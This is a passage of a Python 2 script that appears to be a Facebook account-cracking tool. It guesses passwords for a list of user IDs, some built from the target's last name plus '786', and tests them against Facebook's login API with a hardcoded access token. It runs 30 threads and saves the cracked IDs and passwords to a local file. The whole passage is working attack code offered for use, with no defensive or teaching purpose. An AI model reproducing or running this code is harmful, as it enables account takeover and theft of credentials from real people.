				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['last_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'			
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)	
																												   	
											                               
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
